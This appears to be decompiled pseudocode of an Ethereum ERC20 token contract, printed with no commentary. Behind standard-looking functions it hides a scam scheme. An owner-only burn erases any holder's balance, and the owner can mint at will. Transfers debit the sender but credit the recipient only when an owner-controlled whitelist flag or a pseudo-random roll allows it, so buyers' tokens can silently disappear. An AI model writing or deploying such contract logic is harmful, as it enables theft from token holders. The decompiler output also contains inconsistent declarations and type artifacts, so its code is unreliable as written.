contract main {




// =====================  Runtime code  =====================


mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor2;
uint8 stor3;
uint128 stor3; offset 168
address stor3;
address stor3; offset 8
uint256 sub_bf8c37d4;
uint8 sub_d40cae4f;
uint256 totalSupply;
address owner;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;

function name() payable {
    return name[0 len name.length]
}

function sub_07c9bc5a(?) payable {
    require calldata.size - 4 >= 32
    return bool(stor2[arg1])
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function sub_bf8c37d4(?) payable {
    return sub_bf8c37d4
}

function sub_d40cae4f(?) payable {
    return sub_d40cae4f
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function sub_428cb6ed(?) payable {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    stor2[address(arg1)] = uint8(arg2)
}

function sub_baa6049c(?) payable {
    require calldata.size - 4 >= 96
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    uint8(stor3.field_0) = uint8(arg1)
    address(stor3.field_8) = arg2
    Mask(88, 0, stor3.field_168) = Mask(88, 168, arg1) >> 168
    sub_bf8c37d4 = balanceOf[address(arg2)]
    sub_d40cae4f = arg3
}

function mint(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    if not arg1:
        revert with 0, 'ERC20: mint to the zero address'
    if arg2 + totalSupply < totalSupply:
        revert with 0, 'SafeMath: addition overflow'
    totalSupply += arg2
    if arg2 + balanceOf[address(arg1)] < balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] += arg2
    emit 0x72ddf252: arg2, 0, arg1
}

function burn(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'eOwnable: caller is not the owne'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0xef45524332303a206275726e2066726f6d20746865207a65726f20616464726573,
                    mem[197 len 31]
    if balanceOf[address(arg1)] > totalSupply:
        revert with 0, 'SafeMath: subtraction overflow'
    totalSupply -= balanceOf[address(arg1)]
    balanceOf[address(arg1)] = 0
    emit 0x72ddf252: arg2, arg1, 0
}

function burn(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0xef45524332303a206275726e2066726f6d20746865207a65726f20616464726573,
                    mem[197 len 31]
    if arg1 > balanceOf[address(msg.sender)]:
        revert with 0, 32, 34, 0x7345524332303a206275726e20616d6f756e7420657863656564732062616c616e63, mem[162 len 30], mem[222 len 2]
    balanceOf[address(msg.sender)] -= arg1
    if arg1 > totalSupply:
        revert with 0, 'SafeMath: subtraction overflow'
    totalSupply -= arg1
    emit 0x72ddf252: arg1, msg.sender, 0
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x6545524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if arg2 > allowance[address(msg.sender)][address(arg1)]:
        revert with 0, 
                    32,
                    37,
                    0x7345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a6572,
                    mem[165 len 27],
                    mem[219 len 5]
    if not msg.sender:
        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[296 len 28]
    if not arg1:
        revert with 0, 32, 34, 0x6545524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[294 len 30]
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if stor2[address(msg.sender)]:
        uint8(stor3.field_0) = 1
    else:
        if stor2[address(arg1)]:
            uint8(stor3.field_0) = 1
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(msg.sender)] -= arg2
    if uint8(stor3.field_0):
        if arg2 + balanceOf[address(arg1)] < balanceOf[address(arg1)]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg1)] += arg2
    if not address(stor3.field_8):
        if stor2[address(msg.sender)]:
            uint8(stor3.field_0) = 0
    else:
        if address(stor3.field_8) != msg.sender:
            if not address(stor3.field_8):
                if stor2[address(msg.sender)]:
                    uint8(stor3.field_0) = 0
        else:
            if not stor2[address(arg1)]:
                if not address(stor3.field_8):
                    if stor2[address(msg.sender)]:
                        uint8(stor3.field_0) = 0
            else:
                if sub_bf8c37d4 - arg2 <= balanceOf[address(stor3.field_0)]:
                    sub_bf8c37d4 = balanceOf[address(stor3.field_0)]
                    if not address(stor3.field_8):
                        if stor2[address(msg.sender)]:
                            uint8(stor3.field_0) = 0
                else:
                    if uint8(sha3(block.timestamp, block.number, arg2) % 100) < sub_d40cae4f:
                        uint8(stor3.field_0) = 1
                    else:
                        uint8(stor3.field_0) = 0
                    sub_bf8c37d4 = balanceOf[address(stor3.field_0)]
                    if not address(stor3.field_8):
                        if stor2[address(msg.sender)]:
                            uint8(stor3.field_0) = 0
    emit 0x72ddf252: arg2, msg.sender, arg1
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if stor2[address(arg1)]:
        uint8(stor3.field_0) = 1
    else:
        if stor2[address(arg2)]:
            uint8(stor3.field_0) = 1
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(arg1)] -= arg3
    if uint8(stor3.field_0):
        if arg3 + balanceOf[address(arg2)] < balanceOf[address(arg2)]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg2)] += arg3
    if not address(stor3.field_8):
        if stor2[address(arg1)]:
            uint8(stor3.field_0) = 0
        emit 0x72ddf252: arg3, arg1, arg2
        if arg3 > allowance[address(arg1)][address(msg.sender)]:
            revert with 0, 
                        32,
                        40,
                        0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                        mem[264 len 24],
                        mem[312 len 8]
        if not arg1:
            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
        if not msg.sender:
            revert with 0, 32, 34, 0x6545524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
    else:
        if address(stor3.field_8) != arg1:
            if not address(stor3.field_8):
                if stor2[address(arg1)]:
                    uint8(stor3.field_0) = 0
            emit 0x72ddf252: arg3, arg1, arg2
            if arg3 > allowance[address(arg1)][address(msg.sender)]:
                revert with 0, 
                            32,
                            40,
                            0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                            mem[264 len 24],
                            mem[312 len 8]
            if not arg1:
                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
            if not msg.sender:
                revert with 0, 32, 34, 0x6545524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
        else:
            if not stor2[address(arg2)]:
                if not address(stor3.field_8):
                    if stor2[address(arg1)]:
                        uint8(stor3.field_0) = 0
                emit 0x72ddf252: arg3, arg1, arg2
                if arg3 > allowance[address(arg1)][address(msg.sender)]:
                    revert with 0, 
                                32,
                                40,
                                0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                                mem[264 len 24],
                                mem[312 len 8]
                if not arg1:
                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
                if not msg.sender:
                    revert with 0, 32, 34, 0x6545524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
            else:
                if sub_bf8c37d4 - arg3 <= balanceOf[address(stor3.field_0)]:
                    sub_bf8c37d4 = balanceOf[address(stor3.field_0)]
                    if not address(stor3.field_8):
                        if stor2[address(arg1)]:
                            uint8(stor3.field_0) = 0
                    emit 0x72ddf252: arg3, arg1, arg2
                    if arg3 > allowance[address(arg1)][address(msg.sender)]:
                        revert with 0, 
                                    32,
                                    40,
                                    0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                                    mem[264 len 24],
                                    mem[312 len 8]
                    if not arg1:
                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
                    if not msg.sender:
                        revert with 0, 32, 34, 0x6545524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
                else:
                    if uint8(sha3(block.timestamp, block.number, arg3) % 100) < sub_d40cae4f:
                        uint8(stor3.field_0) = 1
                    else:
                        uint8(stor3.field_0) = 0
                    sub_bf8c37d4 = balanceOf[address(stor3.field_0)]
                    if not address(stor3.field_8):
                        if stor2[address(arg1)]:
                            uint8(stor3.field_0) = 0
                    emit 0x72ddf252: arg3, arg1, arg2
                    if arg3 > allowance[address(arg1)][address(msg.sender)]:
                        revert with 0, 
                                    32,
                                    40,
                                    0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                                    mem[392 len 24],
                                    mem[440 len 8]
                    if not arg1:
                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[520 len 28]
                    if not msg.sender:
                        revert with 0, 32, 34, 0x6545524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[518 len 30]
    ('bool', 'msg.sender')
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
